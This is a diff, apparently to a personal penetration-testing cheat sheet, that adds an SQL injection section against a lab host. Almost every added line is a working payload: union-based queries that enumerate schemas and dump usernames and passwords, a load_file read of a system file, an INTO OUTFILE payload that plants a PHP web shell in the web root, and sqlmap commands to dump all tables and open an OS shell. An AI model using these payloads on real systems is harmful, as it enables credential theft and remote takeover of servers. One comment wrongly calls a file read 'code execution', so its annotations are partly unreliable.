@@ -16,3 +16,20 @@ php -S 0.0.0.0:8000
 ruby -run -e httpd . -p 9000      # . for current directory
 busybox httpd -f -p 10000
 
+# SQLi
+http://10.11.0.22/debug.php?id=1'                                         #watch for errors
+http://10.11.0.22/debug.php?id=1 order by 1                               # 2,3,4,.., // reach the number with different error Ex: Unknown column 4 --> so there are 3 columns
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3                 #The page displays the position of the different columns
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version         #Output DB Version
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()            #Output Current user
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables       #Enumerate database tables
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'     Extract Columns of table - users
+http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users          #Extract fields of the columns from users table
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')  # Code Execution
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'    #SQLi payload to write a PHP shell using the OUTFILE function //If this succeeds, the file should be placed in the web root
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"                            #-p specify parameter
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump        #--dbms to set “MySQL” as the backend type //--dump to dump the contents of all tables in the database //Sqlmap supports several backend databases in the --dbms flag but it doesn’t make a distinction between MariaDB and MySQL. Setting “MySQL” will work well enough for this example.
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --osshell     #--os-shell to execute a shell on the system //in sqlmap we are asked for commands ex:ipconfig --> we receive the output of our commands
+
+
+
